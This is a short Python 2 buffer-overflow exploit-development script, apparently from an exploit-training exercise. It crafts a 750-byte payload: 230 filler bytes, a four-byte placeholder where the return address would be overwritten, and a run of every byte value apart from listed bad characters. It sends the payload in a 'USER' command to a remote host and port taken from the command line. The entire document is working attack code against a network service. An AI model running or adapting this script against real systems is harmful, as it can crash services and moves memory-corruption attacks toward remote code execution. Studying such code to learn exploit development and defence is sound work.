#!/usr/bin/python

import argparse
import sys
import socket

parser = argparse.ArgumentParser("Simple fuzzer for buffer overflow exploits")

parser.add_argument(action='store', dest='rhost', type=str, help='remote host')
parser.add_argument(action='store', type=int, dest='rport', help='remote port')
# parser.add_argument(
#     '-i', '--increment', type=int, dest='increment', required=False, default=50,
#     help='increase the size of the buffer by this much per attempt')

ap = parser.parse_args()
print("Sending exploit to " + ap.rhost + " " + str(ap.rport))

offset = 230
buf_len = 750


badchar_test = ""
badchars = [0x00, 0x0A, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07]

for i in range(0x00, 0xFF + 1):
    if i not in badchars:
        badchar_test += chr(i)
with open("badchar_test.bin", "wb") as f:
    f.write(badchar_test)

buf = ''
buf += '\x41' * offset
buf += '\x42' * 4
buf += badchar_test
buf += '\x43' * (buf_len - len(buf))

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(3)
    s.connect((ap.rhost, ap.rport))
    data = s.recv(1024)
    s.send("USER " + buf + "\r\n")
    data = s.recv(1024)
    print("Sent buffer length " + str(len(buf)))
    s.close()
except Exception:
    print("Exploit failed to send at length " + str(len(buf)))
    sys.exit()
